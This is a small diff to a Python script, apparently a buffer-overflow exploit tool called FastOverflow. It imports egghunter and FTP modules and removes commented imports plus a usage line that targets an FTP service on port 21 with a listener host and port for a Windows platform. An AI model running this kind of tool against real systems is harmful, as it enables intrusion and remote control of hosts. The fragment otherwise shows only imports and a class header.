@@ -1,14 +1,5 @@
 #!/usr/bin/python3
-# import os
-# import shutil
-# import sys
-# import socket
-#
-# import getopt
-# from struct import *
-# import subprocess
-# import re
-# import binascii
+
 from time import sleep
 
 from buffers.egghunter import EggHunter
@@ -18,8 +9,6 @@ from protocols.ftp import *
 from buffers.classic import *
 from utils.system import *
 from utils.config import *
-
-# ./fastoverflow -h 172.16.18.141 -p 21 -f user -m http -lhost 192.168.100.2 -lport 7777 -platform windows
 
 class FastOverflow:
 
